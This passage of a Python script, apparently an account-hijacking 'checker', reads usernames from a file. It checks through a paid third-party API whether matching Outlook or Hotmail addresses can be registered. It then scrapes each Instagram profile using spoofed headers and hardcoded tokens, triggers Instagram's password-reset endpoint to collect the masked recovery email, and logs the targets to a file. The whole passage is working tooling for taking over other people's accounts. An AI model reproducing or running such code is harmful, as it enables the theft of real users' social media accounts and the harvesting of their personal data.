                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}/{self.idf}').json()['status']
                if self.url2=='ok':
                    
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                      
                        fol = ge['data']['user']['edge_followed_by']['count']
                        bio = ge['data']['user']['biography']
                        fols = ge['data']['user']['edge_follow']['count']
                        img = ge['data']['user']['profile_pic_url']
                        nam = ge['data']['user']['full_name']
                        rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                        ree = rl.json()
                        da = ree['date']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                with open('acctive.txt','a',encoding="utf-8") as f0:
                                    f0.write(f'Name : {nam}\nFollowers : {fols}\nFollowing : {fol}\nBio : {bio}\nData : {da}\nRest : {rs}\nEmail : {self.ra}@outlook.com\n')
                                time.sleep(2)
                            except KeyError as error:
                                print('error')
                                with open('acctive.txt','a') as f8:
                                    f8.write(f'{self.ra}@outlook.com\n')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
        print("Complete File .")



    def hotmail(self):
        self.fil = input("[=] - Enter Your Name File : ")
        try:
            self.ope = open(self.fil,'r').read().splitlines()

        except FileNotFoundError as error:
            self.err="THE NAME FILE ERROR IN PHONE !"
            print(self.err)
            sys.exit()
        for self.ra in self.ope:
            try:

                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
                if ('"Subscription":"inactive"') in self.url:
                    os.system("clear")
                    self.pcs ='No acctive id'
                    print(self.pcs)
                    exit()
                elif ('"OK"') in self.url:
                    self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']
                    if self.url2=='ok':
                        with open(f'acctive.txt','a') as f0:
                            f0.write(f'{self.ra}@hotmail.com\n')
                        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                        head2={
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9',
                            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                            'sec-ch-prefers-color-scheme': 'light',
                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                            'viewport-width': '917',
                            'x-asbd-id': '198387',
                            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            'x-ig-app-id': '936619743392459',
                            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                            'x-instagram-ajax': '1006627630',
                            'x-requested-with': 'XMLHttpRequest'
                        }
                        try:
                            ge = requests.get(url2,headers=head2).json()
                            id = ge['data']['user']['id']
                            fol = ge['data']['user']['edge_followed_by']['count']
                            bio = ge['data']['user']['biography']
                            fols = ge['data']['user']['edge_follow']['count']
                            img = ge['data']['user']['profile_pic_url']
                            nam = ge['data']['user']['full_name']
                            rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                            ree = rl.json()
                            da = ree['date']
                            headers1 = {
                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                    'viewport-width': '917',
                                    'x-asbd-id': '198387',
                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                }
                            data3 = {
                                'ig_sig_key_version': '4',
                                "user_id":id
                            }
                            try:
                                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                                try:
                                    rs =str(res['obfuscated_email'])
                                    print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                    with open('acctive.txt','a',encoding="utf-8") as f0:
                                        f0.write(f'Name : {nam}\nFollowers : {fols}\nFollowing : {fol}\nBio : {bio}\nData : {da}\nRest : {rs}\nEmail : {self.ra}@hotmail.com\n')
                                    time.sleep(2)
                                except KeyError as error:
                                    with open('acctive.txt','a') as f8:
                                        f8.write(f'{self.ra}@hotmail.com\n')
                            except requests.exceptions.ConnectionError as error:
                                continue
                        except requests.exceptions.ConnectionError as error:
                            continue
                        self.a+=1
                        os.system('cls' if os.name=='nt'else"clear")
                        print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                    else:
                        self.s+=1
                        os.system('cls' if os.name=='nt'else"clear")
                        print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.u+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            except requests.exceptions.ConnectionError as error:
                continue
        print("Complete File .")



Checker()
    
